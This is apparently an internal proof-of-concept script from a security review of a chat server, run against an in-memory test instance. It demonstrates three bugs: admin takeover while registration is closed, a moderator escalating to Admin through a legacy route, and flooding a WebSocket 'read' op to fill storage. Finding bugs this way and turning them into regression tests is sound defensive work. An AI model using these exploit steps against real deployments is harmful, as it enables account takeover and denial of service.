// Run from anywhere (it never touches the real DB or :3000):
//   NODE_PATH=<repo>/server/node_modules node .dev/security/p11-00-proof.js <repo>/server
// Each finding becomes a regression test in its child packet (P11-01, P11-02, P11-03).
// Proof-of-concept for three P11-00 findings. In-memory DB, random port.
const os = require('os');
const path = require('path');
process.env.NODE_ENV = 'test';
process.env.PORT = 0;
process.env.JWT_SECRET = 'disgourd-proof-secret-0123456789abcdef';
process.env.DB_PATH = ':memory:';
process.env.UPLOADS_DIR = path.join(os.tmpdir(), `disgourd-proof-${process.pid}`);
process.env.REGISTRATION_MODE = 'closed';
const srv = require(path.join(process.argv[2], 'server.js'));
const WebSocket = require('ws');
const db = srv.db;

srv.httpServer.listen(0, async () => {
  const base = `http://localhost:${srv.httpServer.address().port}`;
  const call = async (token, method, p, body) => {
    const r = await fetch(base + p, { method, headers: { 'content-type': 'application/json', ...(token ? { Authorization: `Bearer ${token}` } : {}) }, body: body && JSON.stringify(body) });
    return { status: r.status, body: await r.json().catch(() => null) };
  };
  const reg = (u) => call(null, 'POST', '/register', { username: u, password: 'password123', email: `${u}@example.com` });

  // C1: registration is "closed", yet the first stranger gets in as site admin.
  console.log('auth-info:', (await call(null, 'GET', '/auth-info')).body);
  const m = await reg('mallory');
  const me = await call(m.body.token, 'GET', '/me');
  console.log('C1 first register while closed ->', m.status, 'siteAdmin =', me.body.siteAdmin);
  console.log('C1 second register ->', (await reg('someone')).status);

  // H1: a "Mods" member holding manage_roles promotes themself to Admin via the legacy route.
  db.setSetting('registration_mode', 'open');
  const owner = (await reg('owner')).body.token;
  const mod = (await reg('moddy')).body.token;
  await call(owner, 'POST', '/spaces', { name: 'Guild' });
  const sid = db.getSpaceByName('Guild').id;
  db.addMember(sid, db.getUserByUsername('moddy').id, 'member');
  const made = await call(owner, 'POST', '/spaces/Guild/roles', { name: 'Mods', permissions: ['manage_roles'] });
  await call(owner, 'PUT', `/spaces/Guild/members/moddy/roles/${made.body.role.id}`);
  const before = db.resolveAccess(sid, db.getUserByUsername('moddy').id);
  console.log('H1 before: edit_server =', before.actions.has('edit_server'), 'ban =', before.actions.has('ban_members'));
  const viaRoles = await call(mod, 'PUT', `/spaces/Guild/members/moddy/roles/${(await call(owner, 'GET', '/spaces/Guild/roles')).body.roles.find((r) => r.name === 'Admin').id}`);
  console.log('H1 roles API (should refuse) ->', viaRoles.status, viaRoles.body);
  const legacy = await call(mod, 'PATCH', '/spaces/Guild/members/moddy', { role: 'admin' });
  const after = db.resolveAccess(sid, db.getUserByUsername('moddy').id);
  console.log('H1 legacy PATCH ->', legacy.status, '| after: edit_server =', after.actions.has('edit_server'), 'ban =', after.actions.has('ban_members'));

  // H2: the `read` op stores a row for any (space, channel) strings, unchecked.
  const ws = new WebSocket(`${base.replace('http', 'ws')}/gateway?token=${encodeURIComponent(mod)}`);
  ws.on('open', () => {
    const big = 'x'.repeat(120 * 1024);
    for (let i = 0; i < 20; i++) ws.send(JSON.stringify({ op: 'read', space: `${big}${i}`, channel: big, lastId: 1 }));
    setTimeout(() => {
      const r = db.raw.prepare('SELECT COUNT(*) AS n, SUM(LENGTH(space) + LENGTH(channel)) AS bytes FROM read_state').get();
      console.log(`H2 read_state after 20 frames: ${r.n} rows, ${(r.bytes / 1048576).toFixed(1)} MB`);
      ws.close();
      srv.httpServer.close();
      process.exit(0);
    }, 500);
  });
});
